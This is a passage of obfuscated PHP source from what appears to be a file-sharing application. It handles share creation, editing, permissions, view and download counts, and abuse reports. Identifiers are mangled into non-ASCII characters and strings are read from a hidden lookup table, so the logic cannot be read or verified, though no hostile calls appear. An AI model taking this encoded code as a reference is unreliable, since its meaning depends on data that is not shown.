$Ğ÷ùØ·ø[2065])); if ($­àóÃû˜ == $Ğ÷ùØ·ø[2113]) { $ÇÉà”×Æ = array($Ğ÷ùØ·ø[571] => 1); } else { if ($­àóÃû˜ == $Ğ÷ùØ·ø[1239]) { $ÇÉà”×Æ = array($Ğ÷ùØ·ø[672] => 1); } } $ÇÉà”×Æ[$Ğ÷ùØ·ø[1765]] = USER_ID; $¥èÚş‘ = $this->where($ÇÉà”×Æ)->selectPage($Ò·õö¼Ô); return $¥èÚş‘; } protected function listToMe($Ô”ÖÍ†¤ = 300) { $Í­°ÔÛ =& $_SERVER[³Ôà×Ó]; $óç¬ğ“ = Model($Í­°ÔÛ[2114])->userGroupParents(USER_ID); $ŒÇššáü = array($Í­°ÔÛ[657] => SourceModel::TYPE_USER, $Í­°ÔÛ[578] => USER_ID); if ($óç¬ğ“) { $ŒÇššáü = array(array($Í­°ÔÛ[657] => SourceModel::TYPE_USER, $Í­°ÔÛ[578] => USER_ID), array($Í­°ÔÛ[657] => SourceModel::TYPE_GROUP, $Í­°ÔÛ[578] => array($Í­°ÔÛ[7], $óç¬ğ“)), $Í­°ÔÛ[2112] => $Í­°ÔÛ[2065]); } $»›ÒíÔÀ = Model($Í­°ÔÛ[675])->where($ŒÇššáü)->selectPage($Ô”ÖÍ†¤); $ˆ®áéÉ° = array_to_keyvalue_group($»›ÒíÔÀ[$Í­°ÔÛ[454]], $Í­°ÔÛ[674]); if (!$ˆ®áéÉ°) { return $»›ÒíÔÀ; } $‹¦‘–üõ = $Í­°ÔÛ[2115]; $ŒÇššáü = array($Í­°ÔÛ[674] => array($Í­°ÔÛ[501], array_keys($ˆ®áéÉ°)), $Í­°ÔÛ[1765] => array($Í­°ÔÛ[1089], $Í­°ÔÛ[228])); $Ì“ñÉÒ = $this->field($‹¦‘–üõ)->where($ŒÇššáü)->select(); foreach ($Ì“ñÉÒ as $‡ã­ÉÛ« => &$ïŠ¹†ƒ) { $ïŠ¹†ƒ[$Í­°ÔÛ[2111]] = $ˆ®áéÉ°[$ïŠ¹†ƒ[$Í­°ÔÛ[674]]]; } unset($ïŠ¹†ƒ); $¹ş±î†Œ = array($Í­°ÔÛ[2116] => $Ì“ñÉÒ, $Í­°ÔÛ[2117] => $»›ÒíÔÀ[$Í­°ÔÛ[451]]); return $¹ş±î†Œ; } protected function shareAdd($Ğ¢Şİ³û, $´¸æ–ïù) { $óä¶êğø =& $_SERVER[³Ôà×Ó]; $Ñ€ˆ÷Ã” = $this->_addShareData($Ğ¢Şİ³û, $´¸æ–ïù); if (!empty($´¸æ–ïù[$óä¶êğø[2118]])) { $this->_shareAuthSet($Ñ€ˆ÷Ã”, $´¸æ–ïù[$óä¶êğø[2118]]); } $this->shareEventAdd($Ğ¢Şİ³û, $´¸æ–ïù, $óä¶êğø[2119]); return $Ñ€ˆ÷Ã”; } protected function shareAddSystem($ñ£¢ÌÈÂ, $°¡é®Ê¯) { $Ä‹å‹Ğ· =& $_SERVER[³Ôà×Ó]; $æ¤Ø¸‹Æ = $this->_addShareData($ñ£¢ÌÈÂ, $°¡é®Ê¯, $Ä‹å‹Ğ·[191]); $this->_shareAuthSet($æ¤Ø¸‹Æ, $°¡é®Ê¯[$Ä‹å‹Ğ·[2118]]); return $æ¤Ø¸‹Æ; } private function shareEventAdd($Ì™Œ†à, $í´‰ØŒ, $éš•õ½˜ = "\141\144\x64") { $ƒ°‰¦¾ =& $_SERVER[³Ôà×Ó]; if (!$Ì™Œ†à || $Ì™Œ†à == $ƒ°‰¦¾[228]) { return; } if ($éš•õ½˜ == $ƒ°‰¦¾[2119]) { if ($í´‰ØŒ[$ƒ°‰¦¾[571]] == $ƒ°‰¦¾[91]) { Model($ƒ°‰¦¾[642])->eventShare($Ì™Œ†à, $ƒ°‰¦¾[2120]); } if ($í´‰ØŒ[$ƒ°‰¦¾[672]] == $ƒ°‰¦¾[91]) { Model($ƒ°‰¦¾[642])->eventShare($Ì™Œ†à, $ƒ°‰¦¾[2121]); } return; } $Ï²Òô = $this->getInfoByPath($Ì™Œ†à); $¯©¨§ë = $ƒ°‰¦¾[2122]; if ($Ï²Òô[$ƒ°‰¦¾[571]] == $ƒ°‰¦¾[228] && $í´‰ØŒ[$ƒ°‰¦¾[571]] == $ƒ°‰¦¾[91]) { $¯©¨§ë = $ƒ°‰¦¾[2120]; } if ($Ï²Òô[$ƒ°‰¦¾[571]] == $ƒ°‰¦¾[91] && $í´‰ØŒ[$ƒ°‰¦¾[571]] == $ƒ°‰¦¾[228]) { $¯©¨§ë = $ƒ°‰¦¾[2123]; } if ($Ï²Òô[$ƒ°‰¦¾[672]] == $ƒ°‰¦¾[228] && $í´‰ØŒ[$ƒ°‰¦¾[672]] == $ƒ°‰¦¾[91]) { $¯©¨§ë = $ƒ°‰¦¾[2121]; } if ($Ï²Òô[$ƒ°‰¦¾[672]] == $ƒ°‰¦¾[91] && $í´‰ØŒ[$ƒ°‰¦¾[672]] == $ƒ°‰¦¾[228]) { $¯©¨§ë = $ƒ°‰¦¾[2124]; } Model($ƒ°‰¦¾[642])->eventShare($Ì™Œ†à, $¯©¨§ë); return; } private function _addShareData($©¾«ØŒç, $š«È’º = array(), $ßşş±ğ™ = false) { $Ã€ÄÎßù =& $_SERVER[³Ôà×Ó]; $­üÚÜŸ¼ = $ßşş±ğ™ == $Ã€ÄÎßù[191] ? 0 : USER_ID; $ô™§ô¢ = array($Ã€ÄÎßù[500] => $©¾«ØŒç, $Ã€ÄÎßù[1756] => $­üÚÜŸ¼); if ($©¾«ØŒç == 0) { $ô™§ô¢ = array($Ã€ÄÎßù[2125] => $š«È’º[$Ã€ÄÎßù[1254]], $Ã€ÄÎßù[1756] => $­üÚÜŸ¼); } if ($®‰ Öæ = $this->where($ô™§ô¢)->find()) { return $®‰ Öæ[$Ã€ÄÎßù[674]]; } if ($©¾«ØŒç == 0) { $Å×¥Û´ = array($Ã€ÄÎßù[32] => get_path_this($š«È’º[$Ã€ÄÎßù[87]])); } else { $Å×¥Û´ = Model($Ã€ÄÎßù[899])->sourceInfo($©¾«ØŒç); if (!$Å×¥Û´) { return !1; } } if (!$š«È’º[$Ã€ÄÎßù[1654]]) { $š«È’º[$Ã€ÄÎßù[1654]] = $Å×¥Û´[$Ã€ÄÎßù[32]]; } $Š©±Çò = array($Ã€ÄÎßù[1756] => $­üÚÜŸ¼, $Ã€ÄÎßù[500] => $©¾«ØŒç, $Ã€ÄÎßù[1654] => $Ã€ÄÎßù[12], $Ã€ÄÎßù[571] => 0, $Ã€ÄÎßù[672] => 0, $Ã€ÄÎßù[1254] => $Ã€ÄÎßù[12], $Ã€ÄÎßù[383] => $Ã€ÄÎßù[12], $Ã€ÄÎßù[964] => $Ã€ÄÎßù[12], $Ã€ÄÎßù[2126] => 0, $Ã€ÄÎßù[2127] => 0, $Ã€ÄÎßù[836] => 0, $Ã€ÄÎßù[2128] => $Ã€ÄÎßù[12], $Ã€ÄÎßù[2109] => $Ã€ÄÎßù[12]); $’Ùê¦¡ = explode($Ã€ÄÎßù[50], $Ã€ÄÎßù[2129]); foreach ($’Ùê¦¡ as $çÔ–¢½Æ) { if (!isset($š«È’º[$çÔ–¢½Æ])) { continue; } $Š©±Çò[$çÔ–¢½Æ] = $š«È’º[$çÔ–¢½Æ]; } $›â”¯Ş¨ = $this->add($Š©±Çò); $”¹ğ±ò¤ = array($Ã€ÄÎßù[2109] => short_id($›â”¯Ş¨)); $this->where(array($Ã€ÄÎßù[2130] => $›â”¯Ş¨))->save($”¹ğ±ò¤); return $›â”¯Ş¨; } private function _shareAuthSet($Ãæ”À°ì, $äãÒÛßÙ) { $¯Ü¼¯Ç» =& $_SERVER[³Ôà×Ó]; if (!is_array($äãÒÛßÙ)) { return !1; } $ñÀ™‰ûö = Model($¯Ü¼¯Ç»[2075]); $ñÀ™‰ûö->where(array($¯Ü¼¯Ç»[674] => $Ãæ”À°ì))->delete(); $È¬à…Æ = array(); foreach ($äãÒÛßÙ as $êˆÈä¯€) { $¡¥•¾ßä = SourceModel::TYPE_USER; if ($êˆÈä¯€[$¯Ü¼¯Ç»[190]] == SourceModel::TYPE_GROUP) { $¡¥•¾ßä = SourceModel::TYPE_GROUP; } $ûêŸøÜ½ = array($¯Ü¼¯Ç»[674] => $Ãæ”À°ì, $¯Ü¼¯Ç»[190] => $¡¥•¾ßä, $¯Ü¼¯Ç»[578] => intval($êˆÈä¯€[$¯Ü¼¯Ç»[578]]), $¯Ü¼¯Ç»[2071] => 0, $¯Ü¼¯Ç»[2131] => -1); if ($êˆÈä¯€[$¯Ü¼¯Ç»[2071]]) { $ûêŸøÜ½[$¯Ü¼¯Ç»[2071]] = $êˆÈä¯€[$¯Ü¼¯Ç»[2071]]; } else { if ($êˆÈä¯€[$¯Ü¼¯Ç»[2131]]) { $ûêŸøÜ½[$¯Ü¼¯Ç»[2131]] = $êˆÈä¯€[$¯Ü¼¯Ç»[2131]]; } } $È¬à…Æ[] = $ûêŸøÜ½; } return $ñÀ™‰ûö->addAll($È¬à…Æ, array(), !0); } public function numViewAdd($ò§ëïŸÇ) { $çÚ¹¾º =& $_SERVER[³Ôà×Ó]; $Ìæ’ŒšŸ = array($çÚ¹¾º[2130] => $ò§ëïŸÇ); $this->where($Ìæ’ŒšŸ)->setAdd($çÚ¹¾º[2126]); } public function numDownloadAdd($ŒÛÃ¦¢) { $°·®Şî§ =& $_SERVER[³Ôà×Ó]; $äæ»ù = array($°·®Şî§[2130] => $ŒÛÃ¦¢); $this->where($äæ»ù)->setAdd($°·®Şî§[2127]); } protected function shareEdit($¦‘‹Üˆ¡, $ÎÁœá–ˆ) { $áÀê¤† =& $_SERVER[³Ôà×Ó]; $ñ»ÙõÒÚ = $this->getInfo($¦‘‹Üˆ¡); if (!$ñ»ÙõÒÚ) { return !1; } $this->_checkLinkShare($ÎÁœá–ˆ, $ñ»ÙõÒÚ); $õê‡º™Ú = array(); $ë€àÆ÷š = explode($áÀê¤†[50], $áÀê¤†[2132]); foreach ($ë€àÆ÷š as $¢ îÏé¯) { if (!array_key_exists($¢ îÏé¯, $ÎÁœá–ˆ)) { continue; } $õê‡º™Ú[$¢ îÏé¯] = $ÎÁœá–ˆ[$¢ îÏé¯]; } $this->shareEventAdd($ñ»ÙõÒÚ[$áÀê¤†[193]], $ÎÁœá–ˆ, $áÀê¤†[1933]); $this->where(array($áÀê¤†[2130] => $¦‘‹Üˆ¡))->save($õê‡º™Ú); if (isset($ÎÁœá–ˆ[$áÀê¤†[2118]])) { $this->_shareAuthSet($¦‘‹Üˆ¡, $ÎÁœá–ˆ[$áÀê¤†[2118]]); } return !0; } private function _checkLinkShare($ãì™ìú­, $Ù¥šÉ‰Ú) { $Ÿ‡á Œö =& $_SERVER[³Ôà×Ó]; if ($ãì™ìú­[$Ÿ‡á Œö[571]] != $Ÿ‡á Œö[91]) { return; } $Û¯÷õ× = $Ù¥šÉ‰Ú[$Ÿ‡á Œö[90]][$Ÿ‡á Œö[193]]; if ($Ù¥šÉ‰Ú[$Ÿ‡á Œö[90]][$Ÿ‡á Œö[33]] != $Ÿ‡á Œö[230]) { $¯ûû·âÏ = $this->_folderReport($Û¯÷õ×); if (!$¯ûû·âÏ) { return; } show_json(LNG($Ÿ‡á Œö[2133]) . $Ÿ‡á Œö[2134] . $¯ûû·âÏ, !1); } $ìšÁÎ = Model($Ÿ‡á Œö[899])->fileInfoGet($Ù¥šÉ‰Ú[$Ÿ‡á Œö[90]][$Ÿ‡á Œö[193]]); if (!$ìšÁÎ) { return; } $¿ü˜Ñ¶Ş = $this->shareFileMeta($ìšÁÎ[$Ÿ‡á Œö[550]]); if (isset($¿ü˜Ñ¶Ş[$Ÿ‡á Œö[459]]) && $¿ü˜Ñ¶Ş[$Ÿ‡á Œö[459]] == $Ÿ‡á Œö[91]) { show_json(LNG($Ÿ‡á Œö[2135]), !1); } } private function _folderReport($¨÷Æ÷·) { $¹ì‰•‚– =& $_SERVER[³Ôà×Ó]; $ˆì«íÔ¬ = array($¹ì‰•‚–[550] => array($¹ì‰•‚–[1087], 0), $¹ì‰•‚–[825] => 3); $ËÛö”Ä = Model($¹ì‰•‚–[2136])->where($ˆì«íÔ¬)->field($¹ì‰•‚–[550])->select(); if (!$ËÛö”Ä) { return !1; } $ËÛö”Ä = array_to_keyvalue($ËÛö”Ä, $¹ì‰•‚–[12], $¹ì‰•‚–[550]); $µçÊåÙ = $¹ì‰•‚–[50] . $¨÷Æ÷· . $¹ì‰•‚–[50]; $ˆì«íÔ¬ = array($¹ì‰•‚–[550] => array($¹ì‰•‚–[7], $ËÛö”Ä), $¹ì‰•‚–[593] => array($¹ì‰•‚–[468], "\x25{$µçÊåÙ}\x25"), $¹ì‰•‚–[514] => 0); $ôÑ›¨íÙ = Model($¹ì‰•‚–[899])->where($ˆì«íÔ¬)->field($¹ì‰•‚–[2137])->find(); if (!$ôÑ›¨íÙ) { return !1; } $Ê·ºÏ„° = substr($ôÑ›¨íÙ[$¹ì‰•‚–[593]], strpos($ôÑ›¨íÙ[$¹ì‰•‚–[593]], $µçÊåÙ)); $ˆì«íÔ¬ = array($¹ì‰•‚–[193] => array($¹ì‰•‚–[7], trim($Ê·ºÏ„°, $¹ì‰•‚–[50]))); $å‘úïÖ = Model($¹ì‰•‚–[899])->where($ˆì«íÔ¬)->field($¹ì‰•‚–[32])->select(); $ü½åàŒ“ = array_to_keyvalue($å‘úïÖ, $¹ì‰•‚–[12], $¹ì‰•‚–[32]); $ü½åàŒ“[] = $ôÑ›¨íÙ[$¹ì‰•‚–[32]]; return implode($¹ì‰•‚–[8], $ü½åàŒ“); } protected function remove($ÖƒÈÑÁ‡) { $Â¡µ¾¶é =& $_SERVER[³Ôà×Ó]; $‘ıè‚ÁÔ = is_array($ÖƒÈÑÁ‡) ? $ÖƒÈÑÁ‡ : array($ÖƒÈÑÁ‡); for ($ôäİôğÓ = 0; $ôäİôğÓ < count($‘ıè‚ÁÔ); $ôäİôğÓ++) { $©­‰¯Õ– = $this->getInfo($‘ıè‚ÁÔ[$ôäİôğÓ]); if ($©­‰¯Õ–[$Â¡µ¾¶é[672]] == $Â¡µ¾¶é[91]) { Model($Â¡µ¾¶é[642])->eventShare($©­‰¯Õ–[$Â¡µ¾¶é[193]], $Â¡µ¾¶é[2124]); } if ($©­‰¯Õ–[$Â¡µ¾¶é[571]] == $Â¡µ¾¶é[91]) { Model($Â¡µ¾¶é[642])->eventShare($©­‰¯Õ–[$Â¡µ¾¶é[193]], $Â¡µ¾¶é[2123]); } } if (is_array($ÖƒÈÑÁ‡)) { $ÖƒÈÑÁ‡ = array($Â¡µ¾¶é[7], $ÖƒÈÑÁ‡); } $×Õ«£ü = array($Â¡µ¾¶é[674] => $ÖƒÈÑÁ‡); $ç°òÅÍ» = $this->where($×Õ«£ü)->delete(); if ($ç°òÅÍ») { Model($Â¡µ¾¶é[675])->where(array($Â¡µ¾¶é[674] => $ÖƒÈÑÁ‡))->delete(); } return $ç°òÅÍ»; } protected function removeBySource($†ƒÌ¥ê) { $äÅ˜Ñ£Â =& $_SERVER[³Ôà×Ó]; $¥îÕë – = array($äÅ˜Ñ£Â[500] => array($äÅ˜Ñ£Â[501], $†ƒÌ¥ê)); $Æà®ğÕ€ = $this->field($äÅ˜Ñ£Â[674])->where($¥îÕë –)->select(); $Æà®ğÕ€ = array_to_keyvalue($Æà®ğÕ€, $äÅ˜Ñ£Â[12], $äÅ˜Ñ£Â[674]); if (!$Æà®ğÕ€) { return; } $¥îÕë – = array($äÅ˜Ñ£Â[2130] => array($äÅ˜Ñ£Â[501], $Æà®ğÕ€)); $this->where($¥îÕë –)->delete(); Model($äÅ˜Ñ£Â[675])->where($¥îÕë –)->delete(); } public function listAll($²å‘¿¥è) { $À »ÂéÑ =& $_SERVER[³Ôà×Ó]; $š”»İí³ = array(); if ($²å‘¿¥è[$À »ÂéÑ[1765]]) { $š”»İí³[$À »ÂéÑ[1765]] = $²å‘¿¥è[$À »ÂéÑ[1765]]; } if ($²å‘¿¥è[$À »ÂéÑ[835]]) { $ïıÖÁ›ã = $²å‘¿¥è[$À »ÂéÑ[836]] ? $²å‘¿¥è[$À »ÂéÑ[836]] : strtotime(date($À »ÂéÑ[2138])); $š”»İí³[$À »ÂéÑ[231]] = array($À »ÂéÑ[409], array($²å‘¿¥è[$À »ÂéÑ[835]], $ïıÖÁ›ã)); } if ($²å‘¿¥è[$À »ÂéÑ[33]]) { $š”»İí³[$²å‘¿¥è[$À »ÂéÑ[33]]] = 1; } else { $š”»İí³[] = array($À »ÂéÑ[571] => array($À »ÂéÑ[1087], 0), $À »ÂéÑ[672] => array($À »ÂéÑ[1087], 0), $À »ÂéÑ[2112] => $À »ÂéÑ[2065]); } if ($²å‘¿¥è[$À »ÂéÑ[2061]]) { $š”»İí³[] = array($À »ÂéÑ[2109] => $²å‘¿¥è[$À »ÂéÑ[2061]], $À »ÂéÑ[1654] => array($À »ÂéÑ[468], "\x25{$²å‘¿¥è[$À »ÂéÑ[2061]]}\x25"), $À »ÂéÑ[2112] => $À »ÂéÑ[2065]); } $ßÖ§Ùâî = $this->_makeOrder()->where($š”»İí³)->selectPage(20); if (empty($ßÖ§Ùâî[$À »ÂéÑ[454]])) { return array(); } $this->_listDataApply($ßÖ§Ùâî[$À »ÂéÑ[454]]); return $ßÖ§Ùâî; } public function listDataApply($ ˜òï€„) { $this->_listDataApply($ ˜òï€„); return $ ˜òï€„; } private function _listDataApply(&$êòŸáĞĞ) { $­Ö„Ï¢Î =& $_SERVER[³Ôà×Ó]; $±ùÈŸŸ = array_to_keyvalue($êòŸáĞĞ, $­Ö„Ï¢Î[12], $­Ö„Ï¢Î[1765]); $²É Òªˆ = Model($­Ö„Ï¢Î[607])->userListInfo(array_unique($±ùÈŸŸ)); $ßçØ¢³ = array_to_keyvalue($êòŸáĞĞ, $­Ö„Ï¢Î[12], $­Ö„Ï¢Î[193]); $Ó¦¬ë¨È = Model($­Ö„Ï¢Î[899])->sourceListInfo($ßçØ¢³, !0); foreach ($êòŸáĞĞ as $ëè±•Şé => &$³®¸–ˆº) { $¼Ÿ™¸ï§ = $³®¸–ˆº[$­Ö„Ï¢Î[1765]]; $³®¸–ˆº[$­Ö„Ï¢Î[2139]] = $²É Òªˆ[$¼Ÿ™¸ï§] ? $²É Òªˆ[$¼Ÿ™¸ï§] : !1; $ÒãÂªÕò = $³®¸–ˆº[$­Ö„Ï¢Î[193]]; $³®¸–ˆº[$­Ö„Ï¢Î[90]] = $Ó¦¬ë¨È[$ÒãÂªÕò] ? $Ó¦¬ë¨È[$ÒãÂªÕò] : !1; if ($³®¸–ˆº[$­Ö„Ï¢Î[90]][$­Ö„Ï¢Î[514]] == $­Ö„Ï¢Î[91]) { unset($êòŸáĞĞ[$ëè±•Şé]); } if ($³®¸–ˆº[$­Ö„Ï¢Î[90]] != $­Ö„Ï¢Î[228] && !$³®¸–ˆº[$­Ö„Ï¢Î[90]]) { unset($êòŸáĞĞ[$ëè±•Şé]); } } unset($³®¸–ˆº); $êòŸáĞĞ = array_values($êòŸáĞĞ); } private function _makeOrder($Øõ¦¾–æ = '') { $â·¡¤Ê =& $_SERVER[³Ôà×Ó]; $ÑÈÔƒ‰ö = array($â·¡¤Ê[231], $â·¡¤Ê[836], $â·¡¤Ê[2126], $â·¡¤Ê[2127]); $™¿¾Ü‹ = array($â·¡¤Ê[532] => $â·¡¤Ê[533], $â·¡¤Ê[534] => $â·¡¤Ê[535]); $¤şíä = Input::get($â·¡¤Ê[539], $â·¡¤Ê[7], $â·¡¤Ê[506], $ÑÈÔƒ‰ö); $Ä’‡’÷” = Input::get($â·¡¤Ê[540], $â·¡¤Ê[7], $â·¡¤Ê[2140], array($â·¡¤Ê[2058], $â·¡¤Ê[534])); $Ä’‡’÷” = $™¿¾Ü‹[$Ä’‡’÷”]; $Øõ¦¾–æ = $Øõ¦¾–æ . "{$¤şíä}\40{$Ä’‡’÷”}"; return $this->order($Øõ¦¾–æ); } public function reportAdd($ß¼§ä¢) { $‹ª¿”„ =& $_SERVER[³Ôà×Ó]; $Û¬ÃæÀæ = array($‹ª¿”„[674] => $ß¼§ä¢[$‹ª¿”„[674]], $‹ª¿”„[1765] => USER_ID); if (Model($‹ª¿”„[2136])->where($Û¬ÃæÀæ)->find()) { return !1; } $¾¶‹ˆ±ã = array($‹ª¿”„[674] => $ß¼§ä¢[$‹ª¿”„[674]], $‹ª¿”„[1654] => $ß¼§ä¢[$‹ª¿”„[1654]], $‹ª¿”„[193] => $ß¼§ä¢[$‹ª¿”„[193]], $‹ª¿”„[550] => $ß¼§ä¢[$‹ª¿”„[550]], $‹ª¿”„[1765] => USER_ID, $‹ª¿”„[33] => $ß¼§ä¢[$‹ª¿”„[33]], $‹ª¿”„[535] => $ß¼§ä¢[$‹ª¿”„[535]]); return Model($‹ª¿”„[2136])->add($¾¶‹ˆ±ã); } public function reportList($–Âì•ª») { $…¶òà¸ =& $_SERVER[³Ôà×Ó]; $Å¸¤‘·Ù = array(); if ($–Âì•ª»[$…¶òà¸[835]]) { $ÒËŠÈƒš = $–Âì•ª»[$…¶òà¸[836]] ? $–Âì•ª»[$…¶òà¸[836]] : strtotime(date($…¶òà¸[2138])); $Å¸¤‘·Ù[$…¶òà¸[231]] = array($…¶òà¸[409], array($–Âì•ª»[$…¶òà¸[835]], $ÒËŠÈƒš)); } if (isset($–Âì•ª»[$…¶òà¸[33]]) && in_array($–Âì•ª»[$…¶òà¸[33]], array($…¶òà¸[91], $…¶òà¸[519], $…¶òà¸[2141], $…¶òà¸[2142], $…¶òà¸[2143]))) { $Å¸¤‘·Ù[$…¶òà¸[33]] = $–Âì•ª»[$…¶òà¸[33]]; } if (isset($–Âì•ª»[$…¶òà¸[825]]) && in_array($–Âì•ª»[$…¶òà¸[825]], array($…¶òà¸[228], $…¶òà¸[91], $…¶òà¸[519], $…¶òà¸[2141]))) { $Å¸¤‘·Ù[$…¶òà¸[825]] = $–Âì•ª»[$…¶òà¸[825]]; } $èÍ½ïÜı = Input::get($…¶òà¸[540], $…¶òà¸[7], $…¶òà¸[2140], array($…¶òà¸[2058], $…¶òà¸[534])); $ì¤ı°¦õ = array($…¶òà¸[532] => $…¶òà¸[533], $…¶òà¸[534] => $…¶òà¸[535]); $Ø‹Ï¹ÀÄ = $…¶òà¸[2144] . $ì¤ı°¦õ[$èÍ½ïÜı]; $Åœè›ØØ = Model($…¶òà¸[2136])->where($Å¸¤‘·Ù)->order($Ø‹Ï¹ÀÄ)->selectPage(20); if (empty($Åœè›ØØ[$…¶òà¸[454]])) { return array(); } $ÓÙÜ¦³Ÿ = array_to_keyvalue_group($Åœè›ØØ[$…¶òà¸[454]], $…¶òà¸[825], $…¶òà¸[674]); if (!empty($ÓÙÜ¦³Ÿ[0])) { $–Âì•ª» = $ÓÙÜ¦³Ÿ[0]; $Å¸¤‘·Ù = array($…¶òà¸[674] => array($…¶òà¸[7], $–Âì•ª»)); $ÃŸÖË – = $this->where($Å¸¤‘·Ù)->field($…¶òà¸[674])->select(); $ÃŸÖË – = array_to_keyvalue($ÃŸÖË –, $…¶òà¸[12], $…¶òà¸[674]); $Û¤¥ÁÒÏ = array_diff($–Âì•ª», $ÃŸÖË –); if (!empty($Û¤¥ÁÒÏ)) { foreach ($Åœè›ØØ[$…¶òà¸[454]] as $®ÃÛÕ™ => $†í¤î¤) { if (in_array($†í¤î¤[$…¶òà¸[674]], $Û¤¥ÁÒÏ)) { unset($Åœè›ØØ[$…¶òà¸[454]][$®ÃÛÕ™]); } } } } $this->_listDataApply($Åœè›ØØ[$…¶òà¸[454]]); return $Åœè›ØØ; } public function reportStatus($ëºşøê¸) { $ÜŒèÔ·ñ =& $_SERVER[³Ôà×Ó]; $«ÃÊ¤°© = array($ÜŒèÔ·ñ[484] => $ëºşøê¸[$ÜŒèÔ·ñ[484]]); $àÌø¤å´ = Model($ÜŒèÔ·ñ[2136])->where($«ÃÊ¤°©)->field($ÜŒèÔ·ñ[2145])->find(); if (!$àÌø¤å´) { return !1; } $±ÃÒ¡¥‘ = array($ÜŒèÔ·ñ[825] => $ëºşøê¸[$ÜŒèÔ·ñ[825]]); if ($ëºşøê¸[$ÜŒèÔ·ñ[825]] == $ÜŒèÔ·ñ[2141] && $àÌø¤å´[$ÜŒèÔ·ñ[825]] == $ÜŒèÔ·ñ[2141]) { $±ÃÒ¡¥‘[$ÜŒèÔ·ñ[825]] = 0; } $‰ê—„Íû = Model($ÜŒèÔ·ñ[2136])->where($«ÃÊ¤°©)->save($±ÃÒ¡¥‘); if ($ëºşøê¸[$ÜŒèÔ·ñ[825]] == $ÜŒèÔ·ñ[519]) { if ($àÌø¤å´[$ÜŒèÔ·ñ[550]] != $ÜŒèÔ·ñ[228] && $this->shareFileMeta($àÌø¤å´[$ÜŒèÔ·ñ[550]])) { $this->shareFileMeta($àÌø¤å´[$ÜŒèÔ·ñ[550]], 0); } $this->remove($àÌø¤å´[$ÜŒèÔ·ñ[674]]); return !0; } if ($‰ê—„Íû && $ëºşøê¸[$ÜŒèÔ·ñ[825]] == $ÜŒèÔ·ñ[2141]) { $çÙ›Øë = $±ÃÒ¡¥‘[$ÜŒèÔ·ñ[825]] == $ÜŒèÔ·ñ[2141] ? 1 : 0; $this->shareFileMeta($àÌø¤å´[$ÜŒèÔ·ñ[550]], $çÙ›Øë); $this->removeByFile($àÌø¤å´[$ÜŒèÔ·ñ[550]]); } return $‰ê—„Íû; } private function removeByFile($ÇŸ¤Ñ) { $†İùç”ˆ =& $_SERVER[³Ôà×Ó]; $™‹¨†€Â = Model($†İùç”ˆ[899])->where(array($†İùç”ˆ[550] => $ÇŸ¤Ñ))->field($†İùç”ˆ[193])->select(); $ŠÔŸ¤à“ = array_to_keyvalue($™‹¨†€Â, $†İùç”ˆ[12], $†İùç”ˆ[193]); $®ƒŸ­ı = array($†İùç”ˆ[193] => array($†İùç”ˆ[7], $ŠÔŸ¤à“), $†İùç”ˆ[571] => 1); $™‹¨†€Â = $this->where($®ƒŸ­ı)->field($†İùç”ˆ[674])->select(); if (empty($™‹¨†€Â)) { return; } $¨‰ˆƒÙı = array_to_keyvalue($™‹¨†€Â, $†İùç”ˆ[12], $†İùç”ˆ[674]); $this->remove($¨‰ˆƒÙı); } private function shareFileMeta($Úç½†ëÊ, $¸ŒÍ”Ø = null) { $„—·Ä°ã =& $_SERVER[³Ôà×Ó]; $âÕßœ´Í = array($„—·Ä°ã[550] => $Úç½†ëÊ, $„—·Ä°ã[97] => $„—·Ä°ã[2146]); if (is_null($¸ŒÍ”Ø)) { return Model($„—·Ä°ã[2147])->where($âÕßœ´Í)->find(); } $âÕßœ´Í[$„—·Ä°ã[459]] = $¸ŒÍ”Ø; Model($„—·Ä°ã[2147])->add($âÕßœ´Í, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\x72\x63\x65\137\141\x75\164\150"; public function getAuth($””‡ËŠ) { $Ëá”‰ê =& $_SERVER[³Ôà×Ó]; $Ş·ˆ‰½£ = $this->sourceAuthSelect($””‡ËŠ); $ùÔŠÌ¡ò = array(); $¿’ŠÉ› = array(); $ªë€ŞÇ¸ = 2 << 25; foreach ($Ş·ˆ‰½£ as $ÆàÂ‘‰ˆ) { $¬…ÏÍ»Ÿ = Model($Ëá”‰ê[580])->listData($ÆàÂ‘‰ˆ[$Ëá”‰ê[2071]]); if (!$¬…ÏÍ»Ÿ) { continue; } $ùÔŠÌ¡ò[] = $ÆàÂ‘‰ˆ; $íæ¹Éß = 0; if ($ÆàÂ‘‰ˆ[$Ëá”‰ê[190]] == SourceModel::TYPE_GROUP) { $íæ¹Éß = $ªë€ŞÇ¸ * 2; } if ($ÆàÂ‘‰ˆ[$Ëá”‰ê[190]] == SourceModel::TYPE_USER) { $íæ¹Éß = $ªë€ŞÇ¸; } if ($ÆàÂ‘‰ˆ[$Ëá”‰ê[190]] == SourceModel::TYPE_USER && $ÆàÂ‘‰ˆ[$Ëá”‰ê[578]] == $Ëá”‰ê[228]) { $íæ¹Éß = 0; } $¿’ŠÉ›[] = $¬…ÏÍ»Ÿ[$Ëá”‰ê[496]] + $íæ¹Éß; } array_multisort($¿’ŠÉ›, SORT_DESC, $ùÔŠÌ¡ò); return $ùÔŠÌ¡ò; } public function sourceAuthSelect($ÙÂÍÄ¶œ) { $úĞ¸×áŠ =& $_SERVER[³Ôà×Ó]; static $®å¸Ø Š = array(); $ÇÛıå†ƒ = is_array($ÙÂÍÄ¶œ) ? !1 : !0; if ($ÇÛıå†ƒ) { $ÙÂÍÄ¶œ = array($ÙÂÍÄ¶œ); } $øéÍŸáö = array(); foreach ($ÙÂÍÄ¶œ as $èè²¶ŞŠ) { if (isset($®å¸Ø Š[$èè²¶ŞŠ])) { $øéÍŸáö[$èè²¶ŞŠ] = $®å¸Ø Š[$èè²¶ŞŠ]; } } if (count($øéÍŸáö) == count($ÙÂÍÄ¶œ)) { return $ÇÛıå†ƒ ? $øéÍŸáö[$ÙÂÍÄ¶œ[0]] : $øéÍŸáö; } $ĞÆøûœ = $úĞ¸×áŠ[2148]; $ÕæÒşÊÆ = array($úĞ¸×áŠ[193] => array($úĞ¸×áŠ[7], $ÙÂÍÄ¶œ)); $×¤¼œİ® = $this->field($ĞÆøûœ)->order($úĞ¸×áŠ[484])->where($ÕæÒşÊÆ)->select(); $Ã‰‘É¶ = array_to_keyvalue_group($×¤¼œİ®, $úĞ¸×áŠ[193]); foreach ($ÙÂÍÄ¶œ as $èè²¶ŞŠ) { $®å¸Ø Š[$èè²¶ŞŠ] = $Ã‰‘É¶[$èè²¶ŞŠ] ? 